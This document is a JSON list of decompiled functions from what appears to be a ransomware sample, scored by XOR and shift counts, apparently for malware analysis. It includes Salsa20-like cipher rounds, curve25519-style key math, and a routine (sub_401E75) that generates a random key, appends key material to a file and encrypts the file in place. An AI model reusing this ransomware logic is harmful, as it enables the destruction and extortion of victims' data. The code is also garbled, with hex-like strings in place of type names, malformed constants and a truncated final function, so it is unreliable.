[
    {
        "Function": "sub_40FDA0",
        "Total XOR and shift operations": 15,
        "XOR operations": 0,
        "Shift operations": 15,
        "Operation percentage": "25.00%",
        "Function Body": "\nint __fastcall sub_40FDA0(_DWORD *a1, int *a2, int a3)\n{\n  _DWORD *v4; // edi\n  int v5; // edx\n  int v6; // ebx\n  int v7; // eax\n  int result; // eax\n  unsigned int v9; // esi\n  char v10; // bl\n  unsigned int v11; // edx\n  int v12; // eax\n  unsigned int v13; // esi\n  int v14; // eax\n  unsigned int v15; // edx\n  unsigned int v16; // edi\n  unsigned int v17; // esi\n  int v18; // edx\n  char v19; // [esp+18h] [ebp+8h]\n\n  v4 = a1;\n  v5 = 0;\n  v6 = a3 / 32;\n  if ( a3 / 32 <= 0 || (v5 = a3 / 32, memset(a1, 0, 4 * v6), v4 = a1, v6 < 8) )\n  {\n    do\n    {\n      v7 = *a2++;\n      v4[v5++] = v7;\n    }\n    while ( v5 < 8 );\n  }\n  result = a3 & 0x1F;\n  v19 = result;\n  if ( result )\n  {\n    v9 = v4[6];\n    v10 = 32 - result;\n    v4[7] = (v4[7] << result) | (v9 >> (32 - result));\n    v11 = v4[5];\n    v12 = (v9 << result) | (v11 >> (32 - result));\n    v13 = v4[4];\n    v4[6] = v12;\n    v14 = (v11 << v19) | (v13 >> v10);\n    v15 = v4[3];\n    v4[5] = v14;\n    v4[4] = (v13 << v19) | (v15 >> v10);\n    v16 = v4[2];\n    v17 = a1[1];\n    a1[3] = (v15 << v19) | (v16 >> v10);\n    a1[2] = (v16 << v19) | (v17 >> v10);\n    result = (v17 << v19) | (*a1 >> v10);\n    v18 = *a1 << v19;\n    a1[1] = result;\n    *a1 = v18;\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_405F70",
        "Total XOR and shift operations": 16,
        "XOR operations": 16,
        "Shift operations": 0,
        "Operation percentage": "22.22%",
        "Function Body": "\nint __thiscall sub_405F70(int *this)\n{\n  int v2; // edi\n  int v3; // esi\n  int v4; // ecx\n  int v5; // edx\n  int v6; // eax\n  int v7; // esi\n  int v8; // eax\n  int v9; // edi\n  int v10; // ecx\n  int v11; // edx\n  int v12; // eax\n  int v13; // esi\n  int v14; // eax\n  int v15; // edi\n  int v16; // ecx\n  int v17; // edx\n  int v18; // eax\n  int v19; // esi\n  int v20; // eax\n  int v21; // edi\n  int v22; // ecx\n  int v23; // edx\n  int v24; // eax\n  int result; // eax\n\n  v2 = *this;\n  v3 = this[3];\n  this[1] ^= __ROL4__(*this + v3, 7);\n  v4 = this[1];\n  this[2] ^= __ROL4__(v4 + v2, 9);\n  v5 = this[2];\n  v6 = v3 ^ __ROL4__(v5 + v4, 13);\n  v7 = this[4];\n  this[3] = v6;\n  v8 = v2 ^ __ROR4__(v5 + v6, 14);\n  v9 = this[5];\n  *this = v8;\n  this[6] ^= __ROL4__(v9 + v7, 7);\n  v10 = this[6];\n  this[7] ^= __ROL4__(v10 + v9, 9);\n  v11 = this[7];\n  v12 = v7 ^ __ROL4__(v11 + v10, 13);\n  v13 = this[9];\n  this[4] = v12;\n  v14 = v9 ^ __ROR4__(v11 + v12, 14);\n  v15 = this[10];\n  this[5] = v14;\n  this[11] ^= __ROL4__(v15 + v13, 7);\n  v16 = this[11];\n  this[8] ^= __ROL4__(v16 + v15, 9);\n  v17 = this[8];\n  v18 = v13 ^ __ROL4__(v17 + v16, 13);\n  v19 = this[14];\n  this[9] = v18;\n  v20 = v15 ^ __ROR4__(v17 + v18, 14);\n  v21 = this[15];\n  this[10] = v20;\n  this[12] ^= __ROL4__(v21 + v19, 7);\n  v22 = this[12];\n  this[13] ^= __ROL4__(v22 + v21, 9);\n  v23 = this[13];\n  v24 = v19 ^ __ROL4__(v23 + v22, 13);\n  this[14] = v24;\n  result = v21 ^ __ROR4__(v23 + v24, 14);\n  this[15] = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_402242",
        "Total XOR and shift operations": 16,
        "XOR operations": 16,
        "Shift operations": 0,
        "Operation percentage": "22.22%",
        "Function Body": "\nint __thiscall sub_402242(int *this)\n{\n  int v2; // edi\n  int v3; // esi\n  int v4; // ecx\n  int v5; // edx\n  int v6; // eax\n  int v7; // esi\n  int v8; // eax\n  int v9; // edi\n  int v10; // ecx\n  int v11; // edx\n  int v12; // eax\n  int v13; // esi\n  int v14; // eax\n  int v15; // edi\n  int v16; // ecx\n  int v17; // edx\n  int v18; // eax\n  int v19; // esi\n  int v20; // eax\n  int v21; // edi\n  int v22; // ecx\n  int v23; // edx\n  int v24; // eax\n  int result; // eax\n\n  v2 = *this;\n  v3 = this[12];\n  this[4] ^= __ROL4__(*this + v3, 7);\n  v4 = this[4];\n  this[8] ^= __ROL4__(v4 + v2, 9);\n  v5 = this[8];\n  v6 = v3 ^ __ROL4__(v5 + v4, 13);\n  v7 = this[1];\n  this[12] = v6;\n  v8 = v2 ^ __ROR4__(v5 + v6, 14);\n  v9 = this[5];\n  *this = v8;\n  this[9] ^= __ROL4__(v9 + v7, 7);\n  v10 = this[9];\n  this[13] ^= __ROL4__(v10 + v9, 9);\n  v11 = this[13];\n  v12 = v7 ^ __ROL4__(v11 + v10, 13);\n  v13 = this[6];\n  this[1] = v12;\n  v14 = v9 ^ __ROR4__(v11 + v12, 14);\n  v15 = this[10];\n  this[5] = v14;\n  this[14] ^= __ROL4__(v15 + v13, 7);\n  v16 = this[14];\n  this[2] ^= __ROL4__(v16 + v15, 9);\n  v17 = this[2];\n  v18 = v13 ^ __ROL4__(v17 + v16, 13);\n  v19 = this[11];\n  this[6] = v18;\n  v20 = v15 ^ __ROR4__(v17 + v18, 14);\n  v21 = this[15];\n  this[10] = v20;\n  this[3] ^= __ROL4__(v21 + v19, 7);\n  v22 = this[3];\n  this[7] ^= __ROL4__(v22 + v21, 9);\n  v23 = this[7];\n  v24 = v19 ^ __ROL4__(v23 + v22, 13);\n  this[11] = v24;\n  result = v21 ^ __ROR4__(v23 + v24, 14);\n  this[15] = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_40303D",
        "Total XOR and shift operations": 5,
        "XOR operations": 1,
        "Shift operations": 4,
        "Operation percentage": "12.20%",
        "Function Body": "\nint __cdecl sub_40303D(int *a1, int a2, int a3, unsigned int a4)\n{\n  int v4; // ecx\n  _OWORD *v5; // edx\n  int v6; // ecx\n  unsigned int v7; // esi\n  char v9[64]; // [esp+0h] [ebp-54h] BYREF\n  int v10[2]; // [esp+40h] [ebp-14h] BYREF\n  __int64 v11; // [esp+48h] [ebp-Ch]\n  _OWORD *v12; // [esp+50h] [ebp-4h]\n\n  v5 = (_OWORD *)v4;\n  v12 = (_OWORD *)v4;\n  v11 = 0i64;\n  if ( !v4 || !a1 || !a3 )\n    return 1;\n  v6 = a1[1];\n  v7 = 0;\n  v10[0] = *a1;\n  for ( v10[1] = v6; v7 < a4; ++v7 )\n  {\n    if ( (v7 & 0x3F) == 0 )\n    {\n      LO51FD(v11) = v7 >> 6;\n      BYTE1(v11) = v7 >> 14;\n      BYTE2(v11) = v7 >> 22;\n      BYTE3(v11) = v7 >> 30;\n      sub_40BD53(v5, (char *)v10, (int)v9);\n      v5 = v12;\n    }\n    *(_BYTE *)(v7 + a3) ^= v9[v7 & 0x3F];\n  }\n  return 0;\n}\n// 407C02: variable 'v4' is possibly undefined\n// 40303D: using guessed type char var_54[64];\n\n// nfuncs=26 queued=26 decompiled=26 lumina nreq=0 worse=0 better=0\n// ALL OK, 26 function(s) have been successfully decompiled\n"
    },
    {
        "Function": "sub_404134",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "6.25%",
        "Function Body": "\nunsigned int __thiscall sub_404134(char *this)\n{\n  char *v1; // edi\n  int v2; // esi\n  char *v3; // edx\n  int v4; // ecx\n  int v5; // eax\n  int v6; // esi\n  int i; // edx\n  unsigned int v8; // ecx\n  unsigned int result; // eax\n  int v10[16]; // [esp+8h] [ebp-80h]\n  int v11[16]; // [esp+48h] [ebp-40h] BYREF\n\n  v1 = this + 2;\n  v2 = 0;\n  v3 = this + 2;\n  do\n  {\n    v4 = (unsigned __int8)v3[1];\n    v3 += 4;\n    v5 = (((unsigned __int8)*(v3 - 5) + (((unsigned __int8)*(v3 - 4) + (v4 << 8)) << 8)) << 8)\n       + (unsigned __int8)*(v3 - 6);\n    v11[v2] = v5;\n    v10[v2++] = v5;\n  }\n  while ( v2 < 16 );\n  v6 = 10;\n  do\n  {\n    sub_402242(v11);\n    sub_405F70(v11);\n    --v6;\n  }\n  while ( v6 );\n  for ( i = 0; i < 16; ++i )\n  {\n    v1 += 4;\n    v11[i] += v10[i];\n    v8 = v11[i];\n    *(_DWORD *)(v1 - 6) = v8;\n    result = HIB757(v8);\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_401D3C",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "5.26%",
        "Function Body": "\n_WORD *__fastcall sub_401D3C(int a1, int a2)\n{\n  _WORD *result; // eax\n  int v3; // edx\n  __int16 v4; // cx\n\n  result = (_WORD *)(a1 - 2);\n  v3 = ((a2 - a1) >> 1) + 1;\n  do\n  {\n    v4 = result[v3];\n    *++result = v4;\n  }\n  while ( v4 );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_405759",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "2.94%",
        "Function Body": "\nint __fastcall sub_405759(int *a1, __m128i *a2, int a3)\n{\n  int v3; // eax\n  int v6; // esi\n  int v7; // edx\n  unsigned int v8; // ecx\n  int v9; // ecx\n  int v10; // esi\n  int v11; // edx\n  __int32 v12; // eax\n  int result; // eax\n  __m128i v14; // [esp+Ch] [ebp-40h] BYREF\n  int v15; // [esp+1Ch] [ebp-30h]\n  int v16; // [esp+20h] [ebp-2Ch]\n  int v17; // [esp+24h] [ebp-28h]\n  int v18; // [esp+28h] [ebp-24h]\n  int v19; // [esp+2Ch] [ebp-20h] BYREF\n  int v20; // [esp+30h] [ebp-1Ch]\n  int v21; // [esp+34h] [ebp-18h]\n  int v22; // [esp+38h] [ebp-14h]\n  int v23; // [esp+3Ch] [ebp-10h]\n  int v24; // [esp+40h] [ebp-Ch]\n  int v25; // [esp+44h] [ebp-8h]\n  int v26; // [esp+48h] [ebp-4h]\n\n  v3 = 256;\n  v6 = a3 + 32;\n  while ( 1 )\n  {\n    v7 = *(_DWORD *)(v6 - 4);\n    v6 -= 4;\n    if ( v7 )\n      break;\n    v3 -= 32;\n    if ( v3 <= 0 )\n    {\n      if ( !v3 )\n        goto LABEL_7;\n      break;\n    }\n  }\n  v8 = 0x80705700;\n  if ( v7 >= 0 )\n  {\n    do\n    {\n      v8 >>= 1;\n      --v3;\n    }\n    while ( (v7 & v8) == 0 );\n  }\nLABEL_7:\n  v9 = 0;\n  v10 = v3 - 1;\n  v11 = 0;\n  v19 = 0;\n  v20 = 0;\n  v21 = 0;\n  v22 = 0;\n  v23 = 0;\n  v24 = 0;\n  v25 = 0;\n  v26 = 0;\n  memset(&v14, 0, sizeof(v14));\n  v15 = 0;\n  v16 = 0;\n  v17 = 0;\n  v18 = 0;\n  if ( v3 - 1 >= 0 )\n  {\n    do\n    {\n      sub_40EC44(&v19, &v14);\n      if ( ((*(_DWORD *)(a3 + 4 * ((unsigned int)v10 >> 5)) >> (v10 & 0x1F)) & 1) != 0 )\n        sub_40D65C(&v19, &v14, a1, a2);\n      --v10;\n    }\n    while ( v10 >= 0 );\n    v11 = v20;\n    v9 = v19;\n  }\n  a1[2] = v21;\n  a1[3] = v22;\n  a1[4] = v23;\n  a1[5] = v24;\n  a1[6] = v25;\n  a1[7] = v26;\n  v12 = v14.m128i_i32[0];\n  *a1 = v9;\n  a1[1] = v11;\n  a2->m128i_i64[0] = __PA3C76__(v14.m128i_u32[1], v12);\n  a2->m128i_i64[1] = v14.m128i_i64[1];\n  a2[1].m128i_i32[0] = v15;\n  a2[1].m128i_i32[1] = v16;\n  a2[1].m128i_i32[2] = v17;\n  result = v18;\n  a2[1].m128i_i32[3] = v18;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_40760C",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "2.56%",
        "Function Body": "\n__m128i *__fastcall sub_40760C(int *a1, int a2, _BYTE *a3)\n{\n  bool v3; // zf\n  int v5; // ecx\n  int v6; // eax\n  int v7; // eax\n  int i; // esi\n  int j; // eax\n  __m128i *result; // eax\n  int v11; // ecx\n  int v12; // [esp+Ch] [ebp-20h] BYREF\n  __int64 v13; // [esp+10h] [ebp-1Ch]\n  int v14; // [esp+18h] [ebp-14h]\n  int v15; // [esp+1Ch] [ebp-10h]\n  int v16; // [esp+20h] [ebp-Ch]\n  int v17; // [esp+24h] [ebp-8h]\n  int v18; // [esp+28h] [ebp-4h]\n\n  v13 = *(_QWORD *)(a2 + 4);\n  v14 = *(_DWORD *)(a2 + 12);\n  v15 = *(_DWORD *)(a2 + 16);\n  v3 = (*a3 & 1) == 0;\n  v16 = *(_DWORD *)(a2 + 20);\n  v17 = *(_DWORD *)(a2 + 24);\n  v5 = *(_DWORD *)a2;\n  v6 = *(_DWORD *)(a2 + 28);\n  v12 = *(_DWORD *)a2;\n  v18 = v6;\n  if ( v3 )\n  {\n    *a1 = 0;\n    v7 = 0;\n    a1[1] = 0;\n    a1[2] = 0;\n    a1[3] = 0;\n    a1[4] = 0;\n    a1[5] = 0;\n    a1[6] = 0;\n  }\n  else\n  {\n    *a1 = v5;\n    a1[1] = *(_DWORD *)(a2 + 4);\n    a1[2] = *(_DWORD *)(a2 + 8);\n    a1[3] = *(_DWORD *)(a2 + 12);\n    a1[4] = *(_DWORD *)(a2 + 16);\n    a1[5] = *(_DWORD *)(a2 + 20);\n    a1[6] = *(_DWORD *)(a2 + 24);\n    v7 = *(_DWORD *)(a2 + 28);\n  }\n  a1[7] = v7;\n  for ( i = 1; i < 233; ++i )\n  {\n    sub_40FDA0(&v12, &v12, 1);\n    if ( (v18 & 0x200) != 0 )\n    {\n      for ( j = 0; j < 32; j += 16 )\n        *(__m128i *)((char *)&v12 + j) = _mm_xor_si128(*(__m128i *)(j + 42BC154), *(__m128i *)((char *)&v12 + j));\n    }\n    result = (__m128i *)(*(_DWORD *)&a3[4 * ((unsigned int)i >> 5)] >> (i & 0x1F));\n    if ( ((unsigned __int8)result & 1) != 0 )\n    {\n      result = (__m128i *)a1;\n      v11 = 2;\n      do\n      {\n        ++result;\n        result[-1] = _mm_xor_si128(*(__m128i *)((char *)&result[-1] + (char *)&v12 - (char *)a1), result[-1]);\n        --v11;\n      }\n      while ( v11 );\n    }\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_405F1F",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "1.85%",
        "Function Body": "\n_DWORD *__fastcall sub_405F1F(__int16 *a1, _DWORD *a2)\n{\n  __int16 *v2; // edi\n  int v3; // eax\n  unsigned int v4; // eax\n  unsigned int v5; // esi\n  _DWORD *result; // eax\n  int v7; // ebx\n  _DWORD *v8; // ecx\n  int v9; // esi\n  __int16 v10; // dx\n  char v11; // cl\n  _WORD *v12; // eax\n  _WORD *v14; // [esp+10h] [ebp-Ch]\n  _DWORD *v15; // [esp+14h] [ebp-8h]\n  char v16; // [esp+19h] [ebp-3h]\n  char v17; // [esp+1Ah] [ebp-2h]\n  char v18; // [esp+1Bh] [ebp-1h]\n\n  v2 = a1;\n  v3 = 0;\n  if ( *a1 )\n  {\n    do\n      ++v3;\n    while ( a1[v3] );\n  }\n  v4 = v3 + 2;\n  v5 = v4 >> 1;\n  result = GlobalAlloc(0, 4 * ((v4 >> 1) + v4) + 4);\n  v15 = result;\n  v7 = 0;\n  v18 = 1;\n  v17 = 0;\n  v8 = &result[2 * v5 + 2];\n  v9 = 0;\n  *result = v8;\n  v10 = *v2;\n  v14 = v8;\n  v11 = 0;\n  v16 = 0;\n  if ( *v2 )\n  {\n    v12 = v14;\n    do\n    {\n      if ( v11 )\n      {\n        if ( v10 == 34 )\n        {\n          v11 = 0;\n          v16 = 0;\n        }\n        else\n        {\nLABEL_18:\n          ++v9;\n          *v12++ = v10;\n        }\n      }\n      else\n      {\n        switch ( v10 )\n        {\n          case 9:\n          case 10:\n          case 13:\n          case 32:\n            if ( v17 )\n            {\n              ++v9;\n              *v12++ = 0;\n            }\n            v11 = v16;\n            v17 = 0;\n            v18 = 1;\n            break;\n          case 34:\n            v11 = 1;\n            v16 = 1;\n            v17 = 1;\n            if ( v18 )\n              v15[v7++] = v12;\n            v18 = 0;\n            break;\n          default:\n            v17 = 1;\n            if ( v18 )\n              v15[v7++] = v12;\n            v11 = v16;\n            v18 = 0;\n            goto LABEL_18;\n        }\n      }\n      v10 = v2[1];\n      ++v2;\n    }\n    while ( v10 );\n    result = v15;\n  }\n  v14[v9] = 0;\n  result[v7] = 0;\n  *a2 = v7;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_407603",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "1.61%",
        "Function Body": "\nBOOL __fastcall sub_407603(int a1, __int16 *a2)\n{\n  _WORD *v2; // esi\n  int v3; // ecx\n  __int16 v4; // ax\n  __int16 *v5; // ecx\n  __int16 *v7; // ecx\n  __int16 v8; // ax\n  __int16 *v9; // eax\n  const wchar_t *v10; // edx\n  __int16 *v12; // eax\n  wchar_t v13; // cx\n  DWORD i; // eax\n  HAC4F8 StdHandle; // eax\n  DWORD v17; // [esp-8h] [ebp-214h]\n  LP9392 v18; // [esp+0h] [ebp-20Ch] BYREF\n  __int16 Buffer[260]; // [esp+4h] [ebp-208h] BYREF\n\n  v2 = (_WORD *)&v18 + 1;\n  v3 = ((a1 - (int)Buffer) >> 1) + 1;\n  do\n  {\n    v4 = v2[v3];\n    *++v2 = v4;\n  }\n  while ( v4 );\n  if ( a2 )\n  {\n    v5 = Buffer;\n    while ( *v5++ )\n      ;\n    v7 = v5 - 2;\n    do\n    {\n      v8 = *a2;\n      *++v7 = *a2++;\n    }\n    while ( v8 );\n  }\n  v9 = Buffer;\n  v10 = L\"\\n\";\n  while ( *v9++ )\n    ;\n  v12 = v9 - 2;\n  do\n  {\n    v13 = *v10;\n    *++v12 = *v10++;\n  }\n  while ( v13 );\n  for ( i = 0; Buffer[i]; ++i )\n    ;\n  v18 = 0;\n  v17 = i;\n  StdHandle = GetStdHandle(0xFFA031F5);\n  return WriteConsoleW(StdHandle, Buffer, v17, 0, v18);\n}\n// 40DF8B: using guessed type wchar_t asc_40DF8B[2];\n// 407603: using guessed type __int16 Buffer[260];\n\n"
    },
    {
        "Function": "sub_401E75",
        "Total XOR and shift operations": 6,
        "XOR operations": 0,
        "Shift operations": 6,
        "Operation percentage": "1.57%",
        "Function Body": "\nHAC4F8 __thiscall sub_401E75(LPA2BFR lpFileName)\n{\n  HAC4F8 result; // eax\n  HAC4F8 v2; // edi\n  SIZE_T v3; // ecx\n  HAC4F8 ProcessHeap; // eax\n  HAC4F8 v5; // eax\n  HAC4F8 v6; // eax\n  HAC4F8 v7; // eax\n  __m128i *v8; // ebx\n  HAC4F8 v9; // eax\n  UCHAR *v10; // eax\n  HM3866E LibraryW; // ecx\n  UCHAR *v12; // esi\n  NT3B5CUS (__stdcall *BCryptGenRandom)(BCF40E_ALG_HAC4F8, PU2B9B, ULONG, ULONG); // eax\n  UCHAR *v14; // ecx\n  int v15; // eax\n  int v16; // edx\n  unsigned int v17; // ecx\n  int v18; // eax\n  char *v19; // ecx\n  int v20; // edx\n  unsigned int v21; // ecx\n  char *v22; // edx\n  int i; // edi\n  char v24; // cl\n  char *v25; // esi\n  int v26; // esi\n  unsigned int v27; // edx\n  unsigned int v28; // ecx\n  _BYTE *v29; // ebx\n  unsigned int v30; // edx\n  unsigned int v31; // ecx\n  _BYTE *v32; // esi\n  DWORD v33; // eax\n  LONG HighPart; // ecx\n  DWORD LowPart; // eax\n  LONG v36; // edx\n  DWORD v37; // edi\n  unsigned __int64 v38; // kr08_8\n  HAC4F8 v39; // eax\n  void *v40; // esi\n  int v41; // ecx\n  HAC4F8 v42; // eax\n  HAC4F8 v43; // eax\n  HAC4F8 v44; // eax\n  HAC4F8 v45; // eax\n  HAC4F8 v46; // eax\n  HAC4F8 v47; // eax\n  const WCHAR *v48; // esi\n  _WORD *v49; // ecx\n  int v50; // edx\n  __int16 v51; // ax\n  WCHAR *v52; // ecx\n  __int16 *v53; // edx\n  WCHAR *v55; // ecx\n  __int16 v56; // ax\n  WCHAR *v57; // ecx\n  __int16 *v58; // edx\n  WCHAR *v60; // ecx\n  __int16 v61; // ax\n  HAC4F8 v62; // eax\n  void *v63; // ebx\n  int v64; // ecx\n  HAC4F8 v65; // eax\n  SIZE_T v66; // [esp-4h] [ebp-254h]\n  void *v67; // [esp-4h] [ebp-254h]\n  void *v68; // [esp-4h] [ebp-254h]\n  void *v69; // [esp-4h] [ebp-254h]\n  void *v70; // [esp-4h] [ebp-254h]\n  DWORD v71; // [esp-4h] [ebp-254h]\n  HAC4F8 hFile; // [esp+10h] [ebp-240h]\n  __m128i *v73; // [esp+14h] [ebp-23Ch]\n  LONG v74; // [esp+14h] [ebp-23Ch]\n  LARGE_INBD02R FileSize; // [esp+18h] [ebp-238h] BYREF\n  LP9392 lpMem; // [esp+24h] [ebp-22Ch]\n  LP9392 v77[2]; // [esp+28h] [ebp-228h]\n  DWORD NumberOfBytesWritten; // [esp+30h] [ebp-220h] BYREF\n  LP11F0D lpBuffer; // [esp+34h] [ebp-21Ch]\n  LARGE_INBD02R liDistanceToMove; // [esp+38h] [ebp-218h]\n  DWORD NumberOfBytesRead; // [esp+40h] [ebp-210h] BYREF\n  LPA2BFR lpExistingFileName; // [esp+44h] [ebp-20Ch] BYREF\n  WCHAR NewFileName[260]; // [esp+48h] [ebp-208h] BYREF\n\n  NumberOfBytesRead = 0;\n  lpExistingFileName = lpFileName;\n  result = CreateFileW(lpFileName, 0xC04EB800, 0, 0, 3u, 0, 0);\n  v2 = result;\n  hFile = result;\n  if ( result )\n  {\n    GetFileSizeEx(result, &FileSize);\n    v3 = 0;\n    if ( *(_BYTE *)dword_4037E7 )\n    {\n      do\n        ++v3;\n      while ( *(_BYTE *)(dword_4037E7 + v3) );\n    }\n    v66 = v3;\n    ProcessHeap = GetProcessHeap();\n    lpBuffer = HeapAlloc(ProcessHeap, 0, v66);\n    v5 = GetProcessHeap();\n    lpMem = HeapAlloc(v5, 0, 8u);\n    v6 = GetProcessHeap();\n    v77[0] = HeapAlloc(v6, 0, 0x40u);\n    v7 = GetProcessHeap();\n    v8 = (__m128i *)HeapAlloc(v7, 0, 0x40u);\n    v73 = v8;\n    v9 = GetProcessHeap();\n    v10 = (UCHAR *)HeapAlloc(v9, 0, 0x20u);\n    LibraryW = dword_40139C;\n    v12 = v10;\n    v77[1] = v10;\n    if ( !dword_40139C )\n    {\n      LibraryW = LoadLibraryW(L\"bcrypt.dll\");\n      dword_40139C = LibraryW;\n    }\n    BCryptGenRandom = (NT3B5CUS (__stdcall *)(BCF40E_ALG_HAC4F8, PU2B9B, ULONG, ULONG))dword_4083EA;\n    if ( !dword_4083EA )\n    {\n      BCryptGenRandom = (NT3B5CUS (__stdcall *)(BCF40E_ALG_HAC4F8, PU2B9B, ULONG, ULONG))GetProcAddress(\n                                                                                           LibraryW,\n                                                                                           \"BCryptGenRandom\");\n      dword_4083EA = (int)BCryptGenRandom;\n    }\n    BCryptGenRandom(0, v12, 32, 2);\n    v8->m128i_i32[0] = 19CFB87915;\n    v14 = v12 + 32;\n    v8->m128i_i32[1] = -11AD49525;\n    v15 = 256;\n    v8->m128i_i32[2] = 9522C5566;\n    v8->m128i_i32[3] = 1670D44668;\n    v8[1].m128i_i32[0] = 97E448477;\n    v8[1].m128i_i32[1] = -2030908911;\n    v8[1].m128i_i32[2] = -906900212;\n    v8[1].m128i_i32[3] = 250;\n    v8[2].m128i_i32[0] = 3352C322;\n    v8[2].m128i_i32[1] = 91EE0D774;\n    v8[2].m128i_i32[2] = -12DCF8566;\n    v8[2].m128i_i32[3] = -107F7F2017;\n    v8[3].m128i_i32[0] = -44A5B7114;\n    v8[3].m128i_i32[1] = 538EA312;\n    v8[3].m128i_i32[2] = 174DBB1193;\n    v8[3].m128i_i32[3] = 256;\n    while ( 1 )\n    {\n      v16 = *((_DWORD *)v14 - 1);\n      v14 -= 4;\n      if ( v16 )\n        break;\n      v15 -= 32;\n      if ( v15 <= 0 )\n      {\n        if ( !v15 )\n          goto LABEL_24;\n        break;\n      }\n    }\n    v17 = 0x80705700;\n    if ( v16 >= 0 )\n    {\n      do\n      {\n        v17 >>= 1;\n        --v15;\n      }\n      while ( (v16 & v17) == 0 );\n    }\n    if ( v15 >= 116 )\n    {\n      v18 = 256;\n      v19 = (char *)&unk_40F50D;\n      while ( 1 )\n      {\n        v20 = *((_DWORD *)v19 - 1);\n        v19 -= 4;\n        if ( v20 )\n          break;\n        v18 -= 32;\n        if ( v18 <= 0 )\n        {\n          if ( !v18 )\n            goto LABEL_21;\n          break;\n        }\n      }\n      v21 = 0x80705700;\n      if ( v20 >= 0 )\n      {\n        do\n        {\n          v21 >>= 1;\n          --v18;\n        }\n        while ( (v20 & v21) == 0 );\n      }\nLABEL_21:\n      v22 = (char *)v77[1];\n      for ( i = v18 - 1; i < 256; *(_DWORD *)v25 &= ~(1 << v24) )\n      {\n        v24 = i & 0x1F;\n        v25 = &v22[4 * ((unsigned int)i++ >> 5)];\n      }\n      sub_405759(v8->m128i_i32, v8 + 2, (int)v22);\n      v2 = hFile;\n    }\nLABEL_24:\n    sub_404E71((unsigned int)v77[0]);\n    v26 = dword_4037E7;\n    v27 = 0;\n    if ( *(_BYTE *)dword_4037E7 )\n    {\n      do\n        ++v27;\n      while ( *(_BYTE *)(dword_4037E7 + v27) );\n    }\n    v28 = 0;\n    if ( v27 )\n    {\n      v29 = lpBuffer;\n      do\n      {\n        v29[v28] = *(_BYTE *)(v28 + v26);\n        ++v28;\n      }\n      while ( v28 < v27 );\n      v8 = v73;\n    }\n    v30 = 0;\n    do\n      ++v30;\n    while ( byte_4032FA[v30] );\n    v31 = 0;\n    if ( v30 )\n    {\n      v32 = lpMem;\n      do\n      {\n        v32[v31] = byte_4032FA[v31];\n        ++v31;\n      }\n      while ( v31 < v30 );\n    }\n    SetFilePointerEx(v2, FileSize, 0, 0);\n    SetLastError(0);\n    WriteFile(v2, v8, 0x40u, &NumberOfBytesWritten, 0);\n    if ( GetLastError() != 6 && GetLastError() != 19 )\n    {\n      SetFilePointerEx(v2, (LARGE_INBD02R)(FileSize.QuadPart + 64), 0, 0);\n      v33 = 0;\n      if ( *(_BYTE *)dword_4037E7 )\n      {\n        do\n          ++v33;\n        while ( *(_BYTE *)(v33 + dword_4037E7) );\n      }\n      WriteFile(v2, lpBuffer, v33, &NumberOfBytesWritten, 0);\n      HighPart = FileSize.HighPart;\n      LowPart = FileSize.LowPart;\n      if ( FileSize.QuadPart <= 1219B30 )\n      {\n        v71 = FileSize.LowPart;\n        v62 = GetProcessHeap();\n        v63 = HeapAlloc(v62, 0, v71);\n        liDistanceToMove.QuadPart = 0i64;\n        SetFilePointerEx(hFile, 0i64, 0, 0);\n        ReadFile(hFile, v63, FileSize.LowPart, &NumberOfBytesRead, 0);\n        sub_40303D((int *)lpMem, v64, (int)v63, FileSize.LowPart);\n        v2 = hFile;\n        SetFilePointerEx(hFile, 0i64, 0, 0);\n        WriteFile(hFile, v63, FileSize.LowPart, &NumberOfBytesWritten, 0);\n        v65 = GetProcessHeap();\n        HeapFree(v65, 0, v63);\n        v8 = v73;\n      }\n      else\n      {\n        liDistanceToMove.QuadPart = 0i64;\n        v36 = 0;\n        v74 = 0;\n        v37 = 0;\n        while ( 1 )\n        {\n          v38 = __PA3C76__(HighPart, LowPart) - __PA3C76__(v36, v37);\n          liDistanceToMove.HighPart = (__PA3C76__(HighPart, LowPart) - __PA3C76__(v36, v37)) >> 32;\n          if ( liDistanceToMove.HighPart < 0\n            || (__SPA3C76__(HighPart, LowPart) < __SPA3C76__(v36, v37) || HI70A2D(v38) == 0)\n            && (unsigned int)v38 < 0x27100 )\n          {\n            break;\n          }\n          v39 = GetProcessHeap();\n          v40 = HeapAlloc(v39, 0, 0x27100u);\n          SetFilePointerEx(hFile, (LARGE_INBD02R)__PA3C76__(v74, v37), 0, 0);\n          ReadFile(hFile, v40, 0x27100u, &NumberOfBytesRead, 0);\n          sub_40303D((int *)lpMem, v41, (int)v40, 0x27100u);\n          SetFilePointerEx(hFile, (LARGE_INBD02R)__PA3C76__(v74, v37), 0, 0);\n          WriteFile(hFile, v40, 0x27100u, &NumberOfBytesWritten, 0);\n          v42 = GetProcessHeap();\n          HeapFree(v42, 0, v40);\n          HighPart = FileSize.HighPart;\n          v36 = (__PA3C76__(v74, v37) + 3279FB) >> 32;\n          v37 += 3279FB;\n          v74 = v36;\n          if ( v36 >= FileSize.HighPart )\n          {\n            if ( v36 > FileSize.HighPart )\n              break;\n            LowPart = FileSize.LowPart;\n            if ( v37 >= FileSize.LowPart )\n              break;\n          }\n          else\n          {\n            LowPart = FileSize.LowPart;\n          }\n        }\n        v2 = hFile;\n      }\n    }\n    v67 = (void *)lpBuffer;\n    v43 = GetProcessHeap();\n    HeapFree(v43, 0, v67);\n    v68 = lpMem;\n    v44 = GetProcessHeap();\n    HeapFree(v44, 0, v68);\n    v69 = v77[0];\n    v45 = GetProcessHeap();\n    HeapFree(v45, 0, v69);\n    v46 = GetProcessHeap();\n    